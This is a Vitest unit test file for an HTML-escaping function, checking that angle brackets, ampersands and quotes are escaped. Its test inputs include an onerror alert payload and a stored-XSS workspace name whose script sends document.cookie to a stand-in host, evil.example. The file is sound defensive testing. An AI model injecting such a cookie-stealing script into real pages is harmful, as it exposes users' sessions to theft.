import { describe, expect, it } from "vitest";
import { escapeHtml } from "../html-escape";

describe("escapeHtml", () => {
  it("escapes < and >", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
    expect(escapeHtml("</strong>")).toBe("&lt;/strong&gt;");
  });

  it("escapes &", () => {
    expect(escapeHtml("a & b")).toBe("a &amp; b");
    expect(escapeHtml("&amp;")).toBe("&amp;amp;");
  });

  it("escapes double quotes", () => {
    expect(escapeHtml('say "hello"')).toBe("say &quot;hello&quot;");
  });

  it("escapes single quotes", () => {
    expect(escapeHtml("it's fine")).toBe("it&#39;s fine");
  });

  it("leaves safe text unchanged", () => {
    expect(escapeHtml("Hello, world!")).toBe("Hello, world!");
    expect(escapeHtml("Sprint-2026-02-21")).toBe("Sprint-2026-02-21");
    expect(escapeHtml("")).toBe("");
  });

  it("escapes all five dangerous characters in one string", () => {
    expect(escapeHtml(`<img src="x" onerror='alert(1)' & >`)).toBe(
      "&lt;img src=&quot;x&quot; onerror=&#39;alert(1)&#39; &amp; &gt;",
    );
  });

  it("escapes a stored XSS workspace name", () => {
    const evil = `</strong><script>fetch('https://evil.example/'+document.cookie)</script><strong>`;
    const safe = escapeHtml(evil);
    expect(safe).not.toContain("<");
    expect(safe).not.toContain(">");
    expect(safe).not.toContain('"');
    expect(safe).toContain("&lt;");
    expect(safe).toContain("&gt;");
  });
});
